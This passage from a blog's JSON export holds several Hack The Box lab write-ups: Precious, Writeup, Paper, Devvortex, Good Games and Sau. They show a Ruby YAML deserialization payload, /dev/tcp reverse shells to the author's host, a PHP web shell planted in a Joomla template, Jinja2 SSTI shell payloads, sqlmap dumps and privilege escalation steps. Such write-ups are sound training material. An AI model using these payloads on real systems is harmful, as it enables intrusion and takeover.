language.\\n\\n![alt text](image-pr-17.png)\\n\\n### Task 3 \\n\\nWhich Ruby library are the PDF documents generated with?\\n\\nProviding a public url to be converted, we can the error Cannot load remote URL. \\n\\n![alt text](image-pr-18.png)\\n\\nInstead, we start a Python HTTP server by running ``python3 -m http.server 8080``. Then we can provide the IP address of the host machine to be converted as ``http://<host_ip>:8080`` and get a pdf file back.\\n\\nRunning ``exiftool`` against the pdf file we get the information we need about the Ruby library.\\n\\n![alt text](image-pr-19.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 4\\n\\nWhich 2022 CVE applies to that specific version of pdfkit?\\n\\nBy a quick google search we can find the CVE ID 2022-25765 of the Command Injection vulnerability.\\n\\n### Task 5\\n\\nWhich directory located in the running user\'s home directory is used by Bundler to store configuration files?\\n\\nUsing a PoC for the CVE that can be found at [text](https://github.com/shamo0/PDFkit-CMD-Injection), we start a python server again with the same command ``python3 -m http.server 8080`` and listener on port 4444 ``nc -lvnp 4444``. Then we send the curl exploit and we are connected on the target machine. \\n\\n![alt text](image-pr-20.png)\\n\\nMoving to rubycd home directory and running ``ls -a`` to list the directories, including the hidden ones, we see the .bundle file that contains the configuration files.\\n\\n### Task 6\\n\\nSumbit the flag located in the henry user\'s home directory.\\n\\nInside the .bundle directory we open the config file and get the credentials for the user henry.\\n\\n![alt text](image-pr-22.png)\\n\\nThen, we switch to the henry user by running ``su - henry`` and provide the password from before. Running ``whoami`` shows us that we are now user henry.\\n\\nAfter navigating to the henry user\'s home directory and running ``cat user.txt`` we get the user flag.\\n\\n### Task 7\\n\\nWhich command can henry run with sudo, without providing a password?\\n\\nWe are now gonna run the ``LinEnum.sh`` script to enumerate the host. For that purpose, we first get the script on our host machine and then open a Python server on port 8888 on the directory the script is at. Then, on the target machine we run ``wget http://<host_ip>:8888/LinEnum.sh``. Looking through the result we see that the user henry can sudo the command ``/usr/bin/ruby /opt/update_dependencies.rb``.\\n\\n![alt text](image-pr-23.png)\\n\\n### Task 8 \\n\\nWhich is the name of the file that allows for user-controlled input to the update_dependencies.rb script?\\n\\nOpening the file by `` cat /opt/update_dependencies.rb`` we see that the file used is ``dependencies.yml``.\\n\\n![alt text](image-pr-24.png)\\n\\n### Task 9\\n\\nSubmit the flag located in root\'s home directory.\\n\\nFirst, we inspect the file ``update_dependencies.rb`` and see that there is an unsafe load of the file that allows for user-controlled input.\\n\\n```\\ndef list_from_file\\n    YAML.load(File.read(\\"dependencies.yml\\"))\\nend\\n```\\n\\nThe ``YAML.load()`` deserializes YAML into Ruby objects in an insecure way that can lead to arbitary code execution. Based on this gist [text](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml) we craft the following payload and we place it in the henry\'s home directory.\\n\\n```\\n\\ncat << \'EOF\' > dependencies.yml\\n--- \\n- !ruby/object:Gem::Installer\\n  i: x\\n- !ruby/object:Gem::SpecFetcher\\n  i: y\\n- !ruby/object:Gem::Requirement\\n  requirements:\\n    !ruby/object:Gem::Package::TarReader\\n      io: &1 !ruby/object:Net::BufferedIO\\n        io: &1 !ruby/object:Gem::Package::TarReader::Entry\\n          read: 0\\n          header: \\"abc\\"\\n        debug_output: &1 !ruby/object:Net::WriteAdapter\\n          socket: &1 !ruby/object:Gem::RequestSet\\n            sets: !ruby/object:Net::WriteAdapter\\n              socket: !ruby/module \'Kernel\'\\n              method_id: :system\\n            git_set: cp /bin/bash /tmp/dani; chmod +6777 /tmp/dani\\n          method_id: :resolve\\nEOF\\n``` \\n\\nWe run the script as root ``sudo /usr/bin/ruby /opt/update_dependencies.rb`` that is possible without providing password and then use the command ``/tmp/dani -p`` which launches a new shell. The ``-p`` flag tells bash to preserve the effective UID, which is 0 meaning root thanks to the setuid bit of the chmod command. Finally navigating to the ``/root`` directory and ``cat root.txt`` gives us the root flag."},{"id":"/Writeup","metadata":{"permalink":"/Blog/blog/Writeup","editUrl":"https://github.com/danae-pan/Blog/blog/Writeup.md","source":"@site/blog/Writeup.md","title":"Writeup","description":"Task 1","date":"2025-05-12T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":2.535,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Writeup","date":"2025-05-12T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Precious","permalink":"/Blog/blog/Precious"},"nextItem":{"title":"Paper","permalink":"/Blog/blog/Paper"}},"content":"### Task 1\\n\\nSubmit user flag.\\n\\nOpening the browser to the IP address of the target it is revealed that the web site uses DDoS protection.\\n\\n![alt text](image-w-2.png)\\n\\nNavigating to ``/robots.txt`` we can see that there is a path called ``writeup/``. \\n\\n![alt text](image-w-3.png)\\n\\nThe ``writeup/`` path shows the following page:\\n\\n![alt text](image-w-4.png)\\n\\nRunning ``whatweb`` against the website ``whatweb <target_ip>/writeup -v`` we find the CMS to be ``CMS Made Simple``.\\n\\n![alt text](image-w-5.png)\\n\\nWe can then try the directories used which can be found at ``http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/``. \\n\\nTrying out the path ``admin/`` we get a pop-up to authenticate, default credentials ``username=admin`` and ``password=admin`` did not get us in.\\n\\n![alt text](image-w-6.png)\\n\\nNext, other directories are being tried to find the version of the CMS. At ``doc/CHANGELOG.txt`` we found that the version is 2.2.9.1.\\n\\n![alt text](image-w-7.png)\\n\\nUsing ``searchsploit CMS Made Simple`` we search for exploits and find versions lower than 2.2.10 are vulnerable to SQL Injection.\\n\\n![alt text](image-w-8.png)\\n\\nWe can then copy the exploit from searchsploitby running ``searchsploit -m php/webapps/46635.py`` and run it by ``python3 46635.py -u http://<target_ip>/writeup/ -c -w rocktou.txt`` where the -c switch is specified to crack the detected password. The script detects the credentials which we can then use for the admin login prompt. This did not work but after trying ssh with the same credentials ``ssh <username>@<target_ip>`` we get in and find the user flag on the home directory of the user by ``cat user.txt``.  \\n\\n\x3c!--truncate--\x3e \\n\\n### Task 2\\n\\nSubmit root flag.\\n\\nTo see if we can exploit any vulnerabilities on the target machine we run the script for Linux Enumeration. After getting the bash file on the host machine, we open a server on port 8000, on the directory we downloaded the file to, using the command  \\n`python3 -m http.server 8000`\\n\\nOn the target machine we run  \\n`wget http://10.10.14.85:8000/LinEnum.sh -O /tmp/LinEnum.sh`\\n\\nAfter running the script, we find the user being on the staff group which allows users to add local modifications to the system (`/usr/local`) without needing root privileges. This means if root runs a script or command, and that command is resolved to your version in `/usr/local/bin`, it will run your code as root.\\n\\n![alt text](image-w-9.png)  \\n\\nWe run the following to see which services or scripts might be impacted by `/usr/local/bin`:\\n`grep -r \\"/usr/local/bin\\" /etc/profile* /etc/bash.bashrc /etc/pam.d /etc/update-motd.d 2>/dev/null`.\\nWe confirm that `/usr/local/bin` is part of the `PATH` environment and that the update-motd system executes `uname`. Then, we verify that `/etc/update-motd.d/10-uname` indeed runs `uname`, meaning it could execute our payload if replaced:\\n\\n![alt text](image-w-10.png)\\n\\nSince `/usr/local/bin` comes first in the `PATH`, we can hijack `uname` with our own reverse shell payload.\\n\\nWe first start a listener on our machine:  \\n`nc -lvnp 4444`\\n\\nThen we overwrite `uname` with a malicious script in `/usr/local/bin/uname`:  \\n`echo -e \'#!/bin/bash\\\\n/bin/bash -i >& /dev/tcp/10.10.14.85/4444 0>&1\' > /usr/local/bin/uname`  \\n`chmod +x /usr/local/bin/uname`\\n\\nNow, when the system runs `uname` during SSH login, it executes our reverse shell and gives us a root shell.\\n\\nOnce the reverse shell connects back, we are root and we can read the root flag. \\n`cd /root`  \\n`cat root.txt`\\n\\n![alt text](image-w-11.png)"},{"id":"/Paper","metadata":{"permalink":"/Blog/blog/Paper","editUrl":"https://github.com/danae-pan/Blog/blog/Paper.md","source":"@site/blog/Paper.md","title":"Paper","description":"Task 1","date":"2025-05-05T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":4.245,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Paper","date":"2025-05-05T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Writeup","permalink":"/Blog/blog/Writeup"},"nextItem":{"title":"Devvortex","permalink":"/Blog/blog/Devvortex"}},"content":"### Task 1 \\n\\nHow many TCP ports are open on the remote host?\\n\\n``nmap -sS <target_ip>``\\n\\n![alt text](image-p-1.png)\\n\\n### Task 2\\n\\nWhat is the domain for the Wordpress blog?\\n\\nFor answering this, we will attempt checking the information coming from the headers. \\n\\n``curl -I <target_ip>``\\n\\n![alt text](image-p-2.png)\\n\\nWe can se that the server is leaking information from the backend systems from the X-Backend-Server header that contains the hostname of the target IP.\\n\\n### Task 3\\n\\nWhich 2019 CVE is the wordpress version vulnerable to?\\n\\nFirst, we need to identify the version of wordpress. First, we add the domain to the host file by ``sudo vim /etc/hosts``\\n\\n![alt text](image-p-3.png)\\n\\nThen, we use wpscan, the WordPress security scanner, to find the version and any vulnerabilities. \\n\\n![alt text](image-p-4.png)\\n\\nWe found both the readme.html file location, which usually contains the wordpress version but the specific version was already identified. With a quick google search about the specific version we find the 2019 CVE.\\n\\n### Task 4\\n\\nWhat is the secret registration URL of the employee chat system?\\n\\nWe first need to enumerate the directories using gobuster dir.\\n\\n``gobuster dir -u http://office.paper/ -w <word_list>``\\n\\n![alt text](image-p-5.png)\\n\\nNavigating to the index.php page we see some kind of chat system.\\n\\n![alt text](image-p-6.png)\\n\\nGoing back to the CVE we previously found, this version could allow an unauthenticated user to view private or draft posts. Navigating to the page we also find this interesting post by the user Prinsonmike. Seems that we can use this wordpress vulnerability to access his draft hoping we can find this secret url.\\n\\n![alt text](image-p-8.png)\\n\\nWe navigate ``http://office.paper/?static=1`` and exploit the vulnerability and find the secret url.\\n\\n![alt text](image-p-9.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 5\\n\\nWhat is the name of the bot running on the Rocket Chat instance?\\n\\nWe need to first add to the hosts file the subdomain ``chat.office.paper`` so the ip get resolved. \\n\\nNavigating to the secret url we found on the previous task we see the registration form.\\n\\n![alt text](image-p-10.png)\\n\\nWe register, and the go to the general channel where we see the name of the bot.\\n\\n![alt text](image-p-11.png)\\n\\n### Task 6\\n\\nWhich recyclops commands allows listing files?\\n\\nIn the \\"How to use me?\\" guide of the bot we see all the commands, including the one listing files.\\n\\n![alt text](image-p-12.png)\\n\\n### Task 7\\n\\nWhat is the file name of the file that contains the configuration information of hubot running on the chat system?\\n\\nHubot is a framework to build chat bots. We will try to chat with recyclops, using the commands available to extract the information about the name of the file. Running ``list`` we see that we are on user dwight home directory. \\n\\n![alt text](image-p-15.png)\\n\\nWe go back to the direcotry with ``list ../`` and then list the directory hubot ``list ../hubot``.\\n\\n![alt text](image-p-16.png)\\n\\nLooking through the listed files and google searching hubot documentation to cross-reference, we see some files that could be possible like ``.env`` and ``external-scripts``. We see their contents, first ``file ../hubot/external-scripts.json`` is empty and then ``file ../hubot/.env`` is the one containing the configuration.\\n\\n![alt text](image-p-17.png)\\n\\n### Task 8\\n\\nWhat is the password obtained from that configuration information?\\n\\nFrom the ``.env`` file we obtained from the previous question, we find the password. \\n\\n### Task 9\\n\\nWhich regular user with a home directory exists on Paper other than rocketchat?\\n\\nFrom the previous tasks, we saw that we where on the regular user dwight directory.\\n\\n### Task 10\\n\\nSubmit the flag located in the dwight user\'s home directory.\\n\\nPreviously, when we listed the home directory, by running ``list ../`` we came accross the ``user.txt`` file. We try to see the contents and get the user flag by ``file ../user.txt`` but we get access denied. We try to ssh to the target ip with the username dwight ``ssh dwight@<target_ip`` and the password we found in the ``.env`` file and we are in! We get the user flag by ``cat user.txt``.\\n\\n### Task 11\\n\\nWhat is the polkit version on the remote host?\\n\\nWe first run ``cat /etc/os-release`` to find which os we are on and we see that we are on CentOS. Then we can run ``rpm -qa | grep polkit\\n`` to find the version of polkit.\\n\\n![alt text](image-p-18.png)\\n![alt text](image-p-19.png)\\n\\n### Task 12\\n\\nWhat is the 2021 CVE ID for the vulnerability in this version of polkit related to bypassing credential checks for D-Bus requests?\\n\\nLooking up for CVEs affecting the version of the polkit found, we find CVE-2021-3560 for the vulnerability that allows an unprivileged user to create an administrative user without authentication by abusing D-Bus and timing. \\n\\n### Task 13\\n\\nIn our machine, we clone the exploit from github https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation. Then, we open a http server on port 8080 using ``python3 -m http.server 8080``. From the remote server, we use wget to get the exploit script ``wget http://<host_ip>:8080/poc.sh``. We then ``chmod +x poc.sh`` and run the exploit as many times as needed to get the timing right. We follow the exploit\'s instruction and get a root shell as the secnigma user. \\n\\nWe navigate to the root directory and obtain the root flag by ``cat root.txt``\\n\\n![alt text](image-p-20.png)"},{"id":"/Devvortex","metadata":{"permalink":"/Blog/blog/Devvortex","editUrl":"https://github.com/danae-pan/Blog/blog/Devvortex.md","source":"@site/blog/Devvortex.md","title":"Devvortex","description":"Task 1","date":"2025-04-25T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":4.585,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Devvortex","date":"2025-04-25T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Paper","permalink":"/Blog/blog/Paper"},"nextItem":{"title":"Good Games","permalink":"/Blog/blog/GoodGames"}},"content":"### Task 1\\nHow many open TCP ports are listening on Devvortex?\\n\\nWe can run a nmap to scan the ports on the target ip.\\n\\n``nmap -sS <target_ip>``\\n\\n![alt text](image-d-14.png)\\n\\n### Task 2\\nWhat subdomain is configured on the target\'s web server?\\n\\nNavigating to the ip address on the browser we get this nice screen.\\n\\n![alt text](image-d-15.png)\\n\\nThis seems that the hostname cannot be resolved. Lets edit the /etc/hosts file to add the ip address to be resolved to the target domain.\\n\\n``sudo vim /etc/hosts``\\n\\n![alt text](image-d-16.png)\\n\\nThen for finding the subdomain, we can use gobuster vhost since it is often that htb machine will use name-based virtual hosting, that is when multiple names run on a single ip address.\\n\\n``gobuster vhost -u https://devvortex.htb/ -w usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain``\\n\\n![alt text](image-d-17.png)\\n\\nWe now found the subdomain ``dev.devvortex.htb``.\\n\\n### Task 3\\n\\nWhat Content Management System (CMS) is running on dev.devvortex.htb?\\n\\nWe need to add the previous subdomain we found on the hosts file as well so again, we use the command ``sudo vim /etc/hosts``.\\n\\nFor finding the CMS, we can use WhatWeb.\\n\\nAfter navigating to ``usr/bin`` directory we can run ``whatweb -a 3 dev.devvortex.htb -v``\\n\\n![alt text](image-d-18.png)\\n\\nFrom this search, we could not find the CMS. We can try to dig further on the website by doing a gobuster dir seach to explore further endpoints. \\n\\n``gobuster dir -u http://dev.devvortex.htb -w common.txt``\\n\\nFrom this search we found many endpoints with different status code that will be useful in the following task, one of them is the /administrator endpoint which is usually an interesting finding.\\n\\nNavigating there we see a usual administrator login that reveals that the CMS used is Joomla.\\n\\n![alt text](image-d-19.png)\\n\\nWe csn also find this  looking in the /robots.txt endpoint which is a file that contains the redirections and other info. \\n\\n![alt text](image-d-20.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 4 \\n\\nWhich version of Joomla is running on the target system?\\n\\nThe information about Joomla version is usually on a public facing file that is located on different paths depending on the version of Joomla. It is often that the information is stores under modules diretory or under libraries but this varies. After a google search lookup we find different sources including https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website. Finally, navigating to ``http://dev.devvortex.htb/administrator/manifests/files/joomla.xml`` we find the Joomla version.\\n\\n![alt text](image-d-22.png)\\n\\n### Task 5\\n\\nWhat is the 2023 CVE ID for an information disclosure vulnerability in the version of Joomla running on DevVortex?\\n\\nSearching google for vulnerabilities of the specific Joomla version we found, we quickly find that the CVE-2023-23752 that affects a series of Joomla version including ours.\\n\\n### Task 6\\n\\nWhat is the lewis user\'s password for the CMS?\\n\\nWe launch metasploit ``msfconsole`` and search for the cve we found before. \\n\\n![alt text](image-d-21.png)\\n\\nWe then ``use 0`` to select the options, then ``set RHOSTS dev.devvortex.htb`` to set the target host and finally ``run`` to run the auxiliary. From this, we successfully get the user\'s password. \\n\\n![alt text](image-d-23.png)\\n\\n### Task 7\\n\\nWe can use the credentials from previously to login as administrator on the /administrator endpoint. Navigating to System page we find that there is the template option. Under Site Templates we edit the Cassiopeia Details and Files.\\n\\n![alt text](image-d-24.png)\\n\\nWe add this line of code ``system($_GET[\'cmd\']);`` on the error.php file to get a reverse shell. Before navigating to  ``http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=bash -c \\"bash -i >%26 /dev/tcp/<local_ip>/4444 0>%261\\"`` we need to open a port listening for connections. We can do this by ``nc -lnvp 4444``. After navigating to that url, we obtain a shell.\\n\\n![alt text](image-d-26.png)\\n\\nFirst we spawn a proper shell so we don\'t get stuck onwards. \\n\\n``python3 -c \'import pty; pty.spawn(\\"/bin/bash\\")\'``\\n\\nWe can now connect to the database with the credential we found before.\\n\\n``mysql -u lewis -p``\\nP4ntherg0t1n5r3c0n##\\n\\n![alt text](image-d-27.png)\\n\\nWe list all tables by ``show tables;`` and then ``describe sd4fg_users;`` to see all fields for the user. There, we identfy that this is the table we are asked for by ``select username, id, password from sd4fg_users where username = \'logan\';`` and see the hashed password.\\n\\n![alt text](image-d-28.png)\\n\\n### Task 8\\n\\nFrom the previous task, we listed the hashed password for the logan user by using the select command. We open a new terminal and store this password on a file named ``logan.hash`` and then we can use john the ripper to crack the password so we can obtain the plain text from the hashed version. \\n\\n![alt text](image-d-29.png)\\n\\n### Task 9 \\n\\nSubmit the flag located in the logan user\'s home directory.\\n\\nWith the password we found from the previous task, we ssh to the server with the user logan. \\n\\n![alt text](image-d-30.png)\\n\\nIn this user\'s home directory we find the user.txt that contains the user\'s flag.\\n\\n### Task 10 \\n\\nWhat is the full path to the binary that the lewis user can run with root privileges using sudo?\\n\\nWe can find the path by running ``sudo -l``.\\n\\n![alt text](image-d-31.png)\\n\\n### Task 11\\n\\nWhat is the 2023 CVE ID of the privilege escalation vulnerability in the installed version of apport-cli?\\n\\nWith a google search, we find the id of the CVE to be CVE-2023-1326. \\n\\n### Task 12\\n\\nSubmit the flag located in the root user\'s home directory.\\n\\nWe start by running sudo /usr/bin/apport-cli --file-bug\\n![alt text](image-d-32.png)\\n\\nThere we press any key:\\n\\n![alt text](image-d-33.png)\\n\\nThen we press any key, and finally the option of view report (V) where we land in a text viewer and obtain the root shell by running ``!/bin/bash``\\n\\n![alt text](image-d-34.png)\\n\\nIn the home directory of the root user we find the root.txt which contains the root\'s flag."},{"id":"/GoodGames","metadata":{"permalink":"/Blog/blog/GoodGames","editUrl":"https://github.com/danae-pan/Blog/blog/GoodGames.md","source":"@site/blog/GoodGames.md","title":"Good Games","description":"Task 1","date":"2025-04-20T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":4.89,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Good Games","date":"2025-04-20T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"prevItem":{"title":"Devvortex","permalink":"/Blog/blog/Devvortex"},"nextItem":{"title":"Sau","permalink":"/Blog/blog/Sau"}},"content":"### Task 1\\n\\nSubmit User Flag\\n\\nWe use nmap to find the services on the target machine and we see that an apache server runs on port 80.\\n\\n``nmap -sV target_ip``\\n\\n![alt text](image-g.png)\\n\\nNavigating to the browser we see a login page where we will try bypassing the authentication using SQL injection.\\n\\nServer-Side Template Injection (SSTI) vulnerability arises when an application incorporates user-supplied input directly into its server-side templates without proper sanitization or validation. Template engines, which combine templates with dynamic data to generate web pages, can be exploited through SSTI attacks.\\n\\n\\nTo find forms that are candidates for sql injection run\\n\\n``sqlmap -u \\"http://10.129.51.14/\\" --forms --crawl=2 --dbms=mysql``\\n\\n--crawl=CRAWLDEPTH: crawls the website starting from the target url\\n\\nWe find a total of 8 targets. One of the identified forms is the login form and sqlmap auto-filled blank fields, tried multiple techniques and identified that the email field is vulnerable to time-based blind SQL injection.\\n\\n![alt text](image-g-3.png)\\n\\n![alt text](image-g-5.png)\\n\\nAfter confirming the vulnerability we want to enumerate the database and find the table storing the usernames and passwords to get the user flag.\\n\\nWe can try running the following command to retrieve the databse names.\\n\\n``sqlmap -u \\"http://10.129.51.14/login\\" --data=\\"email=*&password=test123\\" --dbs``\\n\\nWe found 2 available databases named information_schema and main.\\n\\nNext, we will list the tables from each.\\n\\n``sqlmap -u \\"http://10.129.51.14/login\\" --data=\\"email=*&password=test123/login\\" -D <database_name> --tables``\\n\\nStarting with the database named main, we find 3 tables blog, blog_comments and user and which we can further investigate.\\nWe start with the table user.\\n\\n``sqlmap -u \\"http://10.129.51.14/login\\" --data=\\"email=*&password=test123/login\\" -D main -T user --columns``\\n\\nThere, we find 4 columns in total with a column named email and a column name password that might get us the flags we need.\\n\\n![alt text](image-g-9.png)\\n\\nWe then run the following command to retreive that information.\\n\\n``sqlmap -u \\"http://10.129.51.14/login\\" --data=\\"email=*&password=test123/login\\" -D main -T user -C email,password --dump``\\n\\nWe find the email and the password and with those credentials we login after we use a hash cracker to find the plain texts password from the hashed one.\\n\\nNow that we are logged in as admin, we can see a gear on the top right that redirects as to internal-administration.goodgames.htb. We need to edit the /etc/hosts file to point this domain to the target machine\'s IP.\\nNote, editing the hosts file requires administrative privileges.\\n\\n\x3c!--truncate--\x3e \\n\\nFollowing the url, we see a login page:\\n![alt text](image-g-10.png)\\n\\nThere we reuse the credentials that we found on the previous step, where admin is the username. \\nWe are presented with a dashborad for the admin.\\n\\n![alt text](image-g-11.png)\\n\\nAfter we are in we attempt to find a palce where sql injection is possible. Navigating to the settings page,\\nwe see the general information where we can try sql injection on the field of the full name.\\nWe try the usual test of \' OR 1=1 --- and we see this renders as the full name. We then try \\\\{{1+1}} for Jinja2 (Python) and we see this results to two, \\nso we confirm SSTI (Server Side Template Injection) which can lead to an RCE.\\nNow we can go on with jinja2 exploitation. \\n\\nFirst we open a port locally:\\n\\n``nc -lvnp 4343``\\n\\nDifferent ways using some python libraries to exploit including:\\n\\n```\\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'id\').read() }}\\n{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen(\'id\').read() }}\\n{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen(\'id\').read() }}\\n```\\n\\nOr in the shotest versions:\\n```\\n{{ cycler.__init__.__globals__.os.popen(\'id\').read() }}\\n{{ joiner.__init__.__globals__.os.popen(\'id\').read() }}\\n{{ namespace.__init__.__globals__.os.popen(\'id\').read() }}\\n```\\n\\nWe used \\n``{{ cycler.__init__.__globals__.os.popen(\'bash -c \\"bash -i >& /dev/tcp/<local_ip>/<exposed_port> 0>&1\\"\').read() }}``\\n\\nWe now got the root control of the server\\n\\n![alt text](image-g-13.png)\\n\\nWe can then navigate to /home/augustus where we find the user.text, in which the user flag is user flag is located.\\n\\n### Task 2\\n\\nBut since we are already a root user but not finding any root.txt under the /root directory, we might be inside a container.\\n\\nWe can invistigate the cgroup file under the proc folder that contains all processes.\\n\\n![alt text](image-g-15.png)\\n\\nFrom this file, we understand that we are inside a docker container. So, we need to access the host from the container which is known as container escape or breakout.\\n\\nOne way of container gaining access to host file systems, is if they areconfigured to run with the SYS_ADMIN capability which allows\\ncontainers to perform actions through the linux kernel that would be available only to root users on a linux server.\\n\\ncapa=`cat /proc/1/status | grep -i \'CapEff\' | awk \'{print $2}\'`; capsh --decode=$capa\\n\\n\\ngrep CapEff /proc/$$/status\\n\\nCapEff this set represents all the capabilities the process is using at a specific moment in time. \\nThen we need to decode the permitted capcbility using capsh.\\n\\n``capsh -- decode=xxxxxx00000000a80425fb``\\n\\n![alt text](image-g-16.png)\\n\\nAfter decoding, we see that the cap_sys_admin capability is not there, so we cannot use this to escape the container.\\n\\nWe then can try ssh to the host machine using the username augustus and the password we had before found for the admin\\n``ssh augustus@172.19.0.1``\\n\\nAnd it works! \\n\\nSince the container mounts /home/augustus from the host anything the container writes in this directory, is also visible on the host and vice versa.\\n\\nHaving said that we can follow the next steps to create a SUID-root bash binary on the host via a shared volume.\\nWhile in the host we copy the /bin/bash to the current dirrectory ``cp /bin/bash .``.\\nThen inside the container we can:\\n\\n```\\nchown root:root /home/augustus/bash\\nchmod 4777 /home/augustus/bash\\n```\\n\\nNow going back to host, we run ``./bash -p`` to get a root shell and finally get the root flag.\\n\\n![alt text](image-g-18.png)\\n\\nWhat is blind SQL injection?\\n\\n\\nBlind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.\\nMany techniques as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the inkected query within the application\'s responses."},{"id":"/Sau","metadata":{"permalink":"/Blog/blog/Sau","editUrl":"https://github.com/danae-pan/Blog/blog/Sau.md","source":"@site/blog/Sau.md","title":"Sau","description":"Task 1","date":"2025-04-12T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":3.935,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Sau","date":"2025-04-12T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Good Games","permalink":"/Blog/blog/GoodGames"},"nextItem":{"title":"Jerry","permalink":"/Blog/blog/Jerry"}},"content":"### Task 1\\n\\nWhich is the highest open TCP port on the target machine?\\n\\nWe can use nmap to scan ports in the target machine. \\n\\n```nmap -sS -p- <target_ip>```\\n\\n![alt text](image.png)\\n\\n### Task 2\\n\\nWhat is the name of the open source software that the application on 55555 is \\"powered by\\"?\\n\\nTo find information about the software, we can run nmap again with the additional field **-sV**. \\n\\n```nmap -sV -p <target_port> <target_ip>```\\n\\nFrom the result we see that the service is identified as uknown. Even so, we can infer from the fingerprint that is returned that the service is HTTP-based since it responds with HTTP headers. Part of the response is illustrated bellow:\\n\\n![alt text](image-1.png)\\n\\nWe can then navigate to the ip address on the browser and at the bottom of the page we can find the open source software the application is powered by.\\n\\n![alt text](image-2.png)\\n\\n### Task 3\\n\\nWhat is the version of request-baskets running on Sau?\\n\\nFrom the previous task we also see the version of the open source software. \\n\\n### Task 4 \\n\\nWhat is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?\\n\\nBy a quick search on cve.org we can find the CVE ID of this vulnerability. https://www.cve.org/CVERecord?id=CVE-2023-27163\\n\\n### Task 5\\n\\nWhat is the name of the software that the application running on port 80 is \\"powered by\\"?\\n\\nFrom the previous task, we suspect that we can find the software from exploiting the SSRF vulnerability. Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can manipulate a web application into sending unauthorized requests from the server. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input which is exactly what we have in hand when we access the target ip in the browser.\\n\\n![alt text](image-3.png)\\n\\nUsing the vulnerable application, we can exploit the SSRF vulnerability by creating a basket that forwards requests to http://localhost:80 gaining access to the web server that runs the application we are looking for.\\n\\nWe can do that by adding the endpoint. We got the token for the basket created. \\n\\nThen we can configure the basket to forward requests to an internal service. We open the basket, and on the configuration settings we set the forward url to be our local host on port 80.\\n\\n![alt text](image-7.png)\\n\\nThen, if we navigate to the endpoint we made on the browser, it would redirect us to the service running on port 80.\\n\\nThere, on the bottom we see the name of the software.\\n\\n![alt text](image-8.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 6 \\n\\nThere is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path on the webserver targeted by this exploit?\\n\\nBy searching for the vulnerability we find that it exists in the login page. The relative path is ``\\\\login``.\\n\\n### Task 7\\n\\nWhat system user is the Mailtrack application running as on Sau?\\n\\nWe launch Metasploit by running ``msfconsole`` and search ``search mailtrail`` to see if the metasploit framework has any exploits available for the vulnerability. \\n\\n![alt text](image-11.png)\\n\\nWe can see that the only exploit listed is for the vulnerability we are targeting. \\n\\nWe can use the exploit by ``use 0``\\nand see the options that need to be configured by ``show options``\\n\\nWe set RHOSTS, RPORT to the target IP and port and the TARGETURI to the targeted configured endpoint. We also set the LHOST to our host machine, the LPORT is the listen port and is by default 4444.\\n\\nThen we run the exploit by ``run``. And we are in. We run ``shell`` to span a shell and ``whoami`` to see the system user.\\n\\n### Task 8\\n\\nSubmit the flag located in the puma user\'s home directory.\\n\\nWe navigate to the puma user\'s home directory and we list the contents to find and print by ``cat user.txt`` the flag.\\n\\n### Task 9\\n\\nWhat is the full path to the binary (without arguments) the puma user can run as root on Sau?\\n\\nWe can run ``sudo -l`` \\n\\n![alt text](image-13.png)\\n\\nWe then see the full path ``/usr/bin/systemctl``\\n\\n### Task 10\\n\\nWhat is the full version string for the instance of systemd installed on Sau?\\n\\nWe run ``/usr/bin/systemctl --version`` and see the version.\\n\\n``systemd 245 (245.4-4ubuntu3.22)``\\n\\n### Task 11\\n\\nWhat is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?\\n\\nLooking for the CVE ID online we find ``CVE-2023-26604``\\n\\n### Task 12\\n\\nSubmit the flag located in the root user\'s home directory.\\n\\nWe first update the shell by running ``python3 -c \'import pty; pty.spawn(\\"/bin/bash\\")\'``\\n\\nThen we run ``sudo /usr/bin/systemctl status cron.service``\\n\\nand ``!/bin/bash`` to get a shell as root. Then we navigate to the root direcotry and get the 